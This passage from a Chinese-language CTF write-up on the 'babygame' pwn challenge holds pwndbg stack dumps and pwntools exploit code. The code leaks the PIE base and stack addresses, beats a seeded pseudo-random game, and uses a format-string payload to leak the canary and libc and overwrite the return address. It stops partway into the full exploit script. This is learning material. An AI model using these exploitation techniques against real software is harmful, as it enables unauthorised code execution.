class="number">0x7ffe86861fb8</span> —▸ <span class="number">0x558b6a214465</span> ◂— endbr64 </span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│     <span class="number">0x7ffe86861fc0</span> —▸ <span class="number">0x558b6a214570</span> ◂— endbr64 </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│     <span class="number">0x7ffe86861fc8</span> ◂— <span class="number">0x70fd944c7d5b3327</span></span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│     <span class="number">0x7ffe86861fd0</span> —▸ <span class="number">0x558b6a214180</span> ◂— endbr64 </span><br><span class="line"><span class="number">3</span>a:<span class="number">01</span>d0│     <span class="number">0x7ffe86861fd8</span> —▸ <span class="number">0x7ffe86862080</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">3b</span>:<span class="number">01</span>d8│     <span class="number">0x7ffe86861fe0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>c:<span class="number">01e0</span>│     <span class="number">0x7ffe86861fe8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">3</span>d:<span class="number">01e8</span>│     <span class="number">0x7ffe86861ff0</span> ◂— <span class="number">0x8f009940421b3327</span></span><br><span class="line"><span class="number">3</span>e:<span class="number">01f</span>0│     <span class="number">0x7ffe86861ff8</span> ◂— <span class="number">0x8f22c4e53d953327</span></span><br><span class="line"><span class="number">3f</span>:<span class="number">01f</span>8│     <span class="number">0x7ffe86862000</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓        <span class="number">2</span> skipped</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x558b6a213000</span>     <span class="number">0x558b6a214000</span> r--p     <span class="number">1000</span> <span class="number">0</span>      </span><br><span class="line">    /home/yhellow/桌面/babygame</span><br><span class="line">    <span class="number">0x7fefa8526000</span>     <span class="number">0x7fefa8548000</span> r--p    <span class="number">22000</span> <span class="number">0</span>      </span><br><span class="line">    /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.7</span>_amd64/libc<span class="number">-2.31</span>.so</span><br></pre></td></tr></table></figure>
<p>因为开了PIE，所以我首先想到要 leak pro_base</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Please input your name:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">232</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak_addr=<span class="built_in">eval</span>(<span class="built_in">hex</span>(leak_addr)+<span class="string">&#x27;0&#x27;</span>*<span class="number">2</span>) <span class="comment"># 末尾打印不出来</span></span><br><span class="line">pro_base=leak_addr-<span class="number">5376</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;pro_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(pro_base))</span><br></pre></td></tr></table></figure>
<p>接下来要破解“game”，我最初的想法是：循环输入“1”直到打通为止，但伪随机数表中根本不可能出现这种情况，所以我打算也引入随机操作，只要种子合适，就有可能成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br></pre></td></tr></table></figure>
<p>其实 seed 是可以被覆盖的，但是我为了 leak pro_base 放弃了覆盖 seed，为了可以覆盖 seed ，就必须先获得 leak canary</p>
<p>当时就卡在了这里，后面可以 leak stack_addr 的数据都被 canary 保护，即使通过了“game”，在开了PIE的情况下也无法利用格式化漏洞</p>
<p>通过“game”的脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">seed=key.srand(<span class="number">0x31313131</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;round &#x27;</span>+ <span class="built_in">str</span>(i+<span class="number">1</span>)+ <span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">	num=(key.rand()+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br></pre></td></tr></table></figure>
<p>在学习了我们组里一位大佬的 wp 后，我感觉很奇怪， <strong>canary明明被覆盖了却没有立刻报错，后续的利用依然可以正常执行</strong> ，基于这点就可以 leak stack_addr了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Please input your name:&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">256</span>+<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>)</span><br><span class="line">leak_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">stack_addr=leak_addr-<span class="number">528</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;stack_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">seed=key.srand(<span class="number">0x31313131</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;round &#x27;</span>+ <span class="built_in">str</span>(i+<span class="number">1</span>)+ <span class="string">&#x27;: \n&#x27;</span>)</span><br><span class="line">	num=(key.rand()+<span class="number">1</span>)%<span class="number">3</span></span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br></pre></td></tr></table></figure>
<p>这样可以把rbp泄露出来，通过rbp来计算 stack_addr（这里不选择 leak stack_base，通过rbp计算出的stack_base不准确，stack_addr 就是 read 写入的栈地址）</p>
<p>下一步就是利用格式化漏洞来构造循环（因为我们肯定会多次执行程序）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x557a74bd3449</span>    call   <span class="built_in">printf</span>@plt                &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">       format: <span class="number">0x7ffee08a7670</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line">       vararg: <span class="number">0x7ffee08a7670</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>初步定位格式化参数的位置（输入20个“-%p”）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good luck to you.</span><br><span class="line"><span class="number">-0x7ffee08a7670</span><span class="number">-0x100</span><span class="number">-0x7f82e8359002</span><span class="number">-0x12</span>-(nil)<span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x252d70252d70252d</span><span class="number">-0x2d70252d70252d70</span><span class="number">-0x70252d70252d7025</span><span class="number">-0x99059999</span><span class="number">-0xffffffffffffffff</span><span class="number">-0xd68</span><span class="number">-0x7ffee08a7894</span><span class="number">-0x7ffee08a7760</span><span class="number">-0x557a74bd3180</span><span class="number">-0x7ffee08a79a0</span>-(nil)-(nil)<span class="number">-0x7f82e828f5f4</span><span class="number">-0x8</span><span class="number">-0x557a74bd32ef</span><span class="number">-0xa32</span>-(nil)-(nil)\x99\x99\x05*** <span class="built_in">stack</span> smashing detected ***: terminated</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7ffee08a7670</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7ffee08a7678</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7ffee08a7680</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7ffee08a7688</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7ffee08a7690</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x7ffee08a7698</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│             <span class="number">0x7ffee08a76a0</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│             <span class="number">0x7ffee08a76a8</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│             <span class="number">0x7ffee08a76b0</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│             <span class="number">0x7ffee08a76b8</span> ◂— <span class="number">0x252d70252d70252d</span> (<span class="string">&#x27;-%p-%p-%&#x27;</span>)</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│             <span class="number">0x7ffee08a76c0</span> ◂— <span class="number">0x2d70252d70252d70</span> (<span class="string">&#x27;p-%p-%p-&#x27;</span>)</span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│             <span class="number">0x7ffee08a76c8</span> ◂— <span class="number">0x70252d70252d7025</span> (<span class="string">&#x27;%p-%p-%p&#x27;</span>)</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│             <span class="number">0x7ffee08a76d0</span> ◂— <span class="number">0x99059999</span> <span class="comment">/* No.18 */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│             <span class="number">0x7ffee08a76d8</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│             <span class="number">0x7ffee08a76e0</span> ◂— <span class="number">0xd68</span> </span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│             <span class="number">0x7ffee08a76e8</span> —▸ <span class="number">0x7ffee08a7894</span> ◂— <span class="number">0x6161616100000001</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│             <span class="number">0x7ffee08a76f0</span> —▸ <span class="number">0x7ffee08a7760</span> —▸ <span class="number">0x7ffee08a7780</span> —▸ <span class="number">0x7ffee08a78b0</span> ◂— <span class="number">0x0</span> </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│             <span class="number">0x7ffee08a76f8</span> —▸ <span class="number">0x557a74bd3180</span> ◂— endbr64 </span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│             <span class="number">0x7ffee08a7700</span> —▸ <span class="number">0x7ffee08a79a0</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>第一次定位没有发现合适的目标，极有可能被“-%p”覆盖了，所以第二次采用精确定位，随便看看覆盖那部分有没有目标：（输入“-%11$p”）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Good luck to you.</span><br><span class="line"><span class="number">-0x7ffd31ce53d0</span>*** <span class="built_in">stack</span> smashing detected ***: terminated</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7ffd31ce52d0</span> ◂— <span class="number">0x70243131252d</span> <span class="comment">/* &#x27;-%11$p&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7ffd31ce52d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7ffd31ce52e0</span> —▸ <span class="number">0x7ffd31ce53e0</span> —▸ <span class="number">0x7ffd31ce5510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7ffd31ce52e8</span> —▸ <span class="number">0x7efd3be66d6f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, qword ptr [rsp + <span class="number">0x18</span>]  <span class="comment">/* target No.9 */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7ffd31ce52f0</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│             <span class="number">0x7ffd31ce52f8</span> —▸ <span class="number">0x7ffd31ce53d0</span> ◂— <span class="number">0x64f17ed180</span> <span class="comment">/* No.11 */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│             <span class="number">0x7ffd31ce5300</span> —▸ <span class="number">0x7ffd31ce5310</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│             <span class="number">0x7ffd31ce5308</span> ◂— <span class="number">0xb87bdb51f4286a00</span> <span class="comment">/* canary No.13 */</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│             <span class="number">0x7ffd31ce5310</span> ◂— <span class="number">0x3000000010</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│             <span class="number">0x7ffd31ce5318</span> ◂— <span class="number">0x64</span> </span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│             <span class="number">0x7ffd31ce5320</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│             <span class="number">0x7ffd31ce5328</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│             <span class="number">0x7ffd31ce5330</span> ◂— <span class="number">0x99059999</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│             <span class="number">0x7ffd31ce5338</span> ◂— <span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│             <span class="number">0x7ffd31ce5340</span> ◂— <span class="number">0xd68</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│             <span class="number">0x7ffd31ce5348</span> —▸ <span class="number">0x7ffd31ce54f4</span> ◂— <span class="number">0x6161616100000001</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│             <span class="number">0x7ffd31ce5350</span> —▸ <span class="number">0x7ffd31ce53c0</span> —▸ <span class="number">0x7ffd31ce53e0</span> —▸ <span class="number">0x7ffd31ce5510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│             <span class="number">0x7ffd31ce5358</span> —▸ <span class="number">0x5590f17ed180</span> ◂— endbr64 </span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│             <span class="number">0x7ffd31ce5360</span> —▸ <span class="number">0x7ffd31ce5600</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│             <span class="number">0x7ffd31ce5368</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│             <span class="number">0x7ffd31ce5370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│             <span class="number">0x7ffd31ce5378</span> —▸ <span class="number">0x7efd3be495f4</span> (atoi+<span class="number">20</span>) ◂— add    rsp, <span class="number">8</span> <span class="comment">/* to leak libc_base No.27 */</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│             <span class="number">0x7ffd31ce5380</span> ◂— <span class="number">0x8</span> </span><br></pre></td></tr></table></figure>
<p>可以发现：可以在“No.13”处泄露canary，可以在“No.27”处泄露libc_base</p>
<p>写入的内容必须使程序可以循环（这里我想不明白），在和大佬交流过后，我找到了解决的办法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7ffd31ce52d0</span> ◂— <span class="number">0x70243131252d</span> <span class="comment">/* &#x27;-%11$p&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7ffd31ce52d8</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7ffd31ce52e0</span> —▸ <span class="number">0x7ffd31ce53e0</span> —▸ <span class="number">0x7ffd31ce5510</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7ffd31ce52e8</span> —▸ <span class="number">0x7efd3be66d6f</span> (<span class="built_in">printf</span>+<span class="number">175</span>) ◂— mov    rcx, </span><br></pre></td></tr></table></figure>
<p>可以在“read”控制的范围中写入栈上的某个地址，直接修改其内容（这个地址最好是函数pwn的返回地址）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>:<span class="number">0110</span>│ rbp         <span class="number">0x7ffd1b017280</span> —▸ <span class="number">0x7ffd1b0173b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">23</span>:<span class="number">0118</span>│             <span class="number">0x7ffd1b017288</span> —▸ <span class="number">0x560a9a5ba543</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line">    <span class="comment">/* pwn的返回地址 */</span></span><br><span class="line"><span class="number">24</span>:<span class="number">0120</span>│             <span class="number">0x7ffd1b017290</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    <span class="comment">/* 其实这里就是stack_addr(第一次read写入的地址) */</span></span><br></pre></td></tr></table></figure>
<p>可以直接计算返回地址的栈地址，在“No.9”的位置写入它（注意内存对齐）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">target_stack=stack_addr-<span class="number">0x8</span></span><br><span class="line">payload = <span class="string">&quot;%13$p%27$p&quot;</span></span><br><span class="line">payload +=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">0x54c2</span>-<span class="number">0x20</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%9$hn&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x18</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">payload = flat([payload,p64(target_stack)])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">canary=<span class="built_in">int</span>((p.recv(<span class="number">16</span>)),<span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>((p.recv(<span class="number">12</span>)),<span class="number">16</span>)</span><br><span class="line">libc_base=leak_addr-<span class="number">280052</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;canary &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(canary))</span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp <span class="number">0x7fff152d9870</span> ◂— <span class="number">0x3732257024333125</span> (<span class="string">&#x27;%13$p%27&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│             <span class="number">0x7fff152d9878</span> ◂— <span class="number">0x3636363132257024</span> (<span class="string">&#x27;$p%21666&#x27;</span>)</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│             <span class="number">0x7fff152d9880</span> ◂— <span class="number">0x61616e6824392563</span> (<span class="string">&#x27;c%9$hnaa&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│             <span class="number">0x7fff152d9888</span> —▸ <span class="number">0x7fff152d9988</span> —▸ <span class="number">0x55ddcf5f9543</span> ◂— mov    eax, <span class="number">0</span> <span class="comment">/* 此处已经被写入了pwn的返回地址,偏移为&quot;9&quot; */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│             <span class="number">0x7fff152d9890</span> ◂— <span class="number">0x300000000a</span> <span class="comment">/* &#x27;\n&#x27; */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000000014B</span>D <span class="number">128</span>                 call    _puts</span><br><span class="line">.text:<span class="number">00000000000014</span>C2 <span class="number">128</span>                 lea     rax, [rbp+name] <span class="comment">// 0x54c2</span></span><br><span class="line">.text:<span class="number">00000000000014</span>C9 <span class="number">128</span>                 mov     edx, <span class="number">256</span>h       ; nbytes</span><br><span class="line">.text:<span class="number">00000000000014</span>CE <span class="number">128</span>                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">00000000000014</span>D1 <span class="number">128</span>                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">    <span class="comment">/* 我们已经泄露了canary,劫持程序回到栈溢出的点就可以获取shell */</span></span><br><span class="line">    <span class="comment">/* 这个&quot;5&quot;其实是随便写的,因为地址随机化是按页划分的,覆盖低3位,就有1/16的概率匹配 */</span></span><br><span class="line">    <span class="comment">/* 至于为什么选择这个地址,其实也没有什么要求,在这附近就行(在read之前) */</span></span><br></pre></td></tr></table></figure>
<p>最后的栈溢出获取 shell 就很简单了，挂一下完整exp：（注意爆破脚本）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./babygame&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">key=cdll.LoadLibrary(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Please input your name:&#x27;</span>)</span><br><span class="line">	payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">256</span>+<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span></span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;1&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>)</span><br><span class="line">	leak_addr=u64(p.recvuntil(<span 